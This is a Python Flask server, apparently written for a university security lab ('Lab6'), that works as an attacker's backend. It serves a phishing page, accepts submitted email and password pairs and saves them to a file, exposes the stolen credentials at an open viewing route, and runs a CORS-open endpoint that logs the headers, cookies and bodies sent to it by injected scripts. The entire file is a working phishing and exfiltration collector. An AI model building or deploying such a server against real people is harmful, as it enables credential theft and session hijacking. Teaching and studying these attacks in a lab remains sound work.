from flask import Flask, request, send_from_directory, render_template, jsonify
import logging
from datetime import datetime
from flask_cors import CORS
from pathlib import Path

#Config logging
logging.basicConfig(
    filename='server.log',
    level=logging.DEBUG,
    format='%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s'
)


app = Flask(__name__,
    static_folder='res',
    template_folder='templates'  # Add template folder configuration
)
cors = CORS(app, resources={r"/*": {"origins": "*"}}) # allow CORS for all domains on all routes

#Lab6
def save_payload(payload):
    """Save payload to file with timestamp."""
    with open('payloads.txt', 'a') as f:
        f.write(f"{datetime.now()} - {payload}\n")

@app.route("/")
def hello_world():
    return "<p>Hai sa fugim aici: <a href='/api/data'>http://127.0.0.1:5000/api/data</a></p>"

@app.route("/api/email")
def show_email():
    return render_template('email.html')

@app.route("/api/phishing")
def phishing_scheme():
    return render_template('phishing.html')

@app.route("/api/credentiale", methods=['POST'])
def log_credentials():
    # Obține datele din cererea POST
    credentials = request.json
    email = credentials.get('email')
    password = credentials.get('password')

    # Salvează datele într-un fișier text
    with open('credentials.txt', 'a') as f:
        f.write(f"{datetime.now()} - Email: {email}, Password: {password}\n")

    # Logare în consolă pentru debugging
    print(f"[INFO] Credentials received: Email={email}, Password={password}")

    return "Credentials logged successfully!", 200


@app.route("/api/view-credentials")
def view_credentials():
    # Citește fișierul `credentials.txt`
    try:
        with open('credentials.txt', 'r') as f:
            data = f.readlines()
    except FileNotFoundError:
        data = ["No credentials logged yet."]

    # Returnează o pagină HTML simplă
    return render_template('view_credentials.html', credentials=data)


@app.route('/res/<path:filename>')
def serve_static(filename):
    return send_from_directory(app.static_folder, filename)

@app.route("/api/data", methods=['OPTIONS', 'POST'])
def api_data():
    if request.method == 'OPTIONS':
        return '', 200

    # Log request information
    request_info = {
        "method": request.method,
        "headers": dict(request.headers),
        "args": request.args.to_dict(),
        "form": request.form.to_dict(),
        "files": [f.filename for f in request.files.values()],
        "values": request.values.to_dict(),
        "json": request.json,
        "cookies": request.cookies,
        "remote_addr": request.remote_addr
    }

    # Console logging
    print(f"[INFO] Received request to /api/data from {request_info['remote_addr']}")
    for key, value in request_info.items():
        print(f"{key.title()}: {value}")

    # File logging
    app.logger.info("---------------------------------------")
    for key, value in request_info.items():
        app.logger.info(f"{key.title()}: {value}")
    app.logger.info("\n")

    #Lab6
    save_payload(str(request.json))

    return "Data logged successfully!", 200

if __name__ == "__main__":
    # Ensure the required directories exist
    Path("res").mkdir(exist_ok=True)
    Path("templates").mkdir(exist_ok=True)
    Path("res/css").mkdir(exist_ok=True)

    app.run(debug=True, host="0.0.0.0", port=5000)